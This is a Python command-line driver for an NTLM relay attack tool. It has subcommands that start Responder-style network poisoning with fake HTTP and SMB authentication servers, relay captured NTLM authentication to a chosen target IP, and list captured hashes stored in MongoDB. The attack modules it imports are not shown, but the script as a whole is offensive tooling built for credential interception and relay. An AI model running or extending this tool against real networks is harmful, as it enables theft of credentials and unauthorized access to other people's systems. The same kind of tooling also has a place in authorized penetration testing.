import warnings
from cryptography.utils import CryptographyDeprecationWarning
warnings.filterwarnings('ignore', category=CryptographyDeprecationWarning, message='.*TripleDES.*')
warnings.filterwarnings('ignore', category=CryptographyDeprecationWarning)

import argparse
import os
import sys
import logging
import ctypes
from datetime import datetime
from scapy.all import get_if_list, conf
import subprocess

# Add the project root directory to Python path
project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
sys.path.insert(0, project_root)

from src.utils.hash_handler import process_ntlm_hash
from src.utils.packet_sniffer import start_capture
from src.modules.exploit.relay import Relay
from src.utils.mongo_handler import MongoDBHandler
from src.modules.capture.responder import ResponderCapture

def is_admin():
    """Check if the script is running with administrator privileges"""
    try:
        is_admin = os.getuid() == 0
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin

def list_interfaces():
    """List available network interfaces"""
    interfaces = get_if_list()
    print("\nAvailable interfaces:")
    for iface in interfaces:
        print(f"- {iface}")
    print("\nUsage example: --interface eth0")

def setup_logging():
    """Configure logging"""
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(module)s - %(message)s',
        handlers=[
            logging.FileHandler("ntlm_relay.log"),
            logging.StreamHandler()
        ]
    )
    return logging.getLogger(__name__)

def list_results(mongo_handler, logger):
    """List captured results from MongoDB"""
    try:
        logger.info("Querying MongoDB for captures...")
        if mongo_handler:
            try:
                # Test MongoDB connection
                mongo_handler.db.command('ping')
                logger.debug("MongoDB connection test successful")
                
                # Get all captures
                captures = mongo_handler.get_captures()
                logger.debug(f"MongoDB query returned {len(captures)} captures")
                
                if captures:
                    print("\nMongoDB Captures:")
                    print("=" * 80)
                    print(f"{'ID':<24} {'Timestamp':<25} {'Type':<10} {'Source IP':<15} {'Request Name'}")
                    print("-" * 80)
                    for capture in captures:
                        id_str = str(capture.get('_id', 'N/A'))
                        timestamp_val = capture.get('timestamp', 'N/A')
                        timestamp_str = timestamp_val.strftime('%Y-%m-%d %H:%M:%S') if isinstance(timestamp_val, datetime) else str(timestamp_val)
                        capture_type = capture.get('type', 'N/A')
                        source = capture.get('source', 'N/A')
                        request_name = capture.get('request_name', 'N/A')
                        print(f"{id_str:<24} {timestamp_str:<25} {capture_type:<10} {source:<15} {request_name}")
                    print("=" * 80)
                else:
                    logger.info("No captures found in MongoDB")
                    
                # Get results
                results = mongo_handler.get_results()
                if results:
                    print("\nMongoDB Results:")
                    print("=" * 80)
                    print(f"{'ID':<24} {'Timestamp':<25} {'Status':<10} {'Details'}")
                    print("-" * 80)
                    for result in results:
                        id_str = str(result.get('_id', 'N/A'))
                        timestamp_val = result.get('timestamp', 'N/A')
                        timestamp_str = timestamp_val.strftime('%Y-%m-%d %H:%M:%S') if isinstance(timestamp_val, datetime) else str(timestamp_val)
                        status = result.get('status', 'N/A')
                        details = result.get('details', 'N/A')
                        print(f"{id_str:<24} {timestamp_str:<25} {status:<10} {details}")
                    print("=" * 80)
                else:
                    logger.info("No results found in MongoDB")
                    
            except Exception as e:
                logger.error(f"Error querying MongoDB: {e}", exc_info=True)
        else:
            logger.error("MongoDB handler not available")
            
    except Exception as e:
        logger.error(f"Error in list_results: {e}", exc_info=True)

def main():
    """Main entry point"""
    logger = setup_logging()
    
    parser = argparse.ArgumentParser(description='NTLM Relay Tool')
    parser.add_argument('command', choices=['poison', 'relay', 'list'], help='Command to execute')
    parser.add_argument('--interface', help='Network interface to use')
    parser.add_argument('--target', help='Target IP address for relay mode')
    parser.add_argument('--debug', action='store_true', help='Enable debug logging')
    args = parser.parse_args()

    if args.debug:
        logger.setLevel(logging.DEBUG)
    
    # Initialize MongoDB
    try:
        mongo_db = MongoDBHandler()
        logger.info("MongoDB connection established")
    except Exception as e:
        logger.error(f"Failed to connect to MongoDB: {e}")
        return
    
    try:
        if args.command == 'poison':
            if not args.interface:
                logger.error("Interface is required for poisoning mode")
                list_interfaces()
                return
                
            logger.info(f"Starting Responder poisoning on interface {args.interface}...")
            try:
                responder = ResponderCapture(interface=args.interface)
                responder.start_poisoning()
                logger.info("Poisoning servers started. Press Ctrl+C to stop.")
                logger.info(f"HTTP server running on port {responder.auth_ports['http']}")
                logger.info(f"SMB server running on port {responder.auth_ports['smb']}")
                while True:
                    import time
                    time.sleep(1)
            except PermissionError:
                logger.error("Permission denied. Try running with administrator privileges.")
                return
            except KeyboardInterrupt:
                logger.info("Stopping poisoning servers...")
                responder.stop_poisoning()
            except Exception as e:
                logger.error(f"Failed to start poisoning: {str(e)}")
                responder.stop_poisoning()
                
        elif args.command == 'relay':
            if not args.interface:
                logger.error("Interface is required for relay mode")
                list_interfaces()
                return
            
            if not args.target:
                logger.error("Target IP is required for relay mode")
                return
                
            logger.info(f"Starting NTLM relay on interface {args.interface} targeting {args.target}...")
            try:
                relay = Relay(interface=args.interface)
                relay.set_target(args.target)
                relay.start_relay()
            except Exception as e:
                logger.error(f"Failed to start relay: {str(e)}")
                
        elif args.command == 'list':
            list_results(mongo_db, logger)
            
    except KeyboardInterrupt:
        logger.info("Exiting...")
    except Exception as e:
        logger.error(f"Unhandled error: {str(e)}")
    finally:
        if 'mongo_db' in locals():
            mongo_db.disconnect()

if __name__ == "__main__":
    if not is_admin():
        print("This script requires administrator privileges")
        sys.exit(1)
    main()